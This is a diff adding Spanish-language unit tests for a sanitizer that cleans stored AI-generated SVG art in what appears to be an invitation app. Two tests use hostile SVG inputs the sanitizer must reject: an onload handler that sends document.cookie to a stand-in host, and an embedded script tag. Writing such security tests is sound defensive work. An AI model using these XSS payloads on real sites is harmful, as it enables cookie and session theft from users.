@@ -11,6 +11,7 @@ import {
   quitarPieza,
   validarPieza,
   validarPropuestas,
+  sanearArteGuardado,
   type ArteInvitacion,
 } from "@/lib/ia/arte";
 import { PALETAS } from "@/config/diseno";
@@ -169,4 +170,60 @@ test("toda paleta del catálogo da colores usables (ninguna se queda muda)", () 
     const colores = coloresDePaleta(paleta);
     assert.ok(colores.length >= 4, `la paleta ${id} solo dio ${colores.length} colores`);
   }
+});
+
+/* ---------- el guardado ---------- */
+
+test("un SVG que nunca pasó la aduana NO se guarda, venga como venga", () => {
+  // Esto es el ataque de verdad: la tarjeta del editor manda cosas
+  // buenas, pero una acción de servidor se llama con lo que sea.
+  const { arte, descartadas } = sanearArteGuardado({
+    version: 1,
+    monograma: {
+      svg: '<svg viewBox="0 0 120 120" onload="fetch(\'https://ajeno.test?c=\'+document.cookie)"><path d="M0 0"/></svg>',
+      idea: "parece inofensivo",
+      generadoEn: "2026-11-26",
+    },
+  });
+  assert.equal(arte, undefined, "no puede quedar nada guardado");
+  assert.equal(descartadas.length, 1);
+  assert.match(descartadas[0], /monograma: Atributo no permitido/);
+});
+
+test("al guardar, lo bueno se queda y lo malo se cae: pieza por pieza", () => {
+  const { arte, descartadas } = sanearArteGuardado({
+    version: 1,
+    divisor: { svg: svgDe("0 0 240 40"), idea: "el bueno", generadoEn: "2026-11-26" },
+    esquina: { svg: '<svg viewBox="0 0 80 80"><script>alert(1)</script></svg>', idea: "el malo" },
+  });
+  assert.ok(arte?.divisor, "el divisor bueno se guarda");
+  assert.equal(arte?.esquina, undefined, "la esquina con script no");
+  assert.equal(descartadas.length, 1);
+});
+
+test("el guardado no exige la paleta: cambiar de color no desarma la invitación", () => {
+  // El adorno se dibujó con el oro de entonces. Si mañana el equipo
+  // cambia la paleta, el ornamento que ya estaba puesto NO se borra solo.
+  const svg = '<svg viewBox="0 0 240 40">' + '<path d="M1 1" fill="#d4af37"/>'.repeat(3) + "</svg>";
+  const { arte, descartadas } = sanearArteGuardado({ version: 1, divisor: { svg, idea: "oro viejo" } });
+  assert.ok(arte?.divisor);
+  assert.deepEqual(descartadas, []);
+});
+
+test("basura en el campo arte no revienta el guardado", () => {
+  assert.deepEqual(sanearArteGuardado(null), { arte: undefined, descartadas: [] });
+  assert.deepEqual(sanearArteGuardado("<svg/>"), { arte: undefined, descartadas: [] });
+  assert.deepEqual(sanearArteGuardado({ monograma: 42 }), { arte: undefined, descartadas: [] });
+  assert.deepEqual(sanearArteGuardado({ otra_cosa: { svg: "<svg/>" } }), {
+    arte: undefined,
+    descartadas: [],
+  });
+});
+
+test("una fecha de generación inventada se reemplaza, no se guarda", () => {
+  const { arte } = sanearArteGuardado({
+    version: 1,
+    divisor: { svg: svgDe("0 0 240 40"), idea: "x", generadoEn: "y".repeat(500) },
+  });
+  assert.ok((arte?.divisor?.generadoEn ?? "").length < 40);
 });
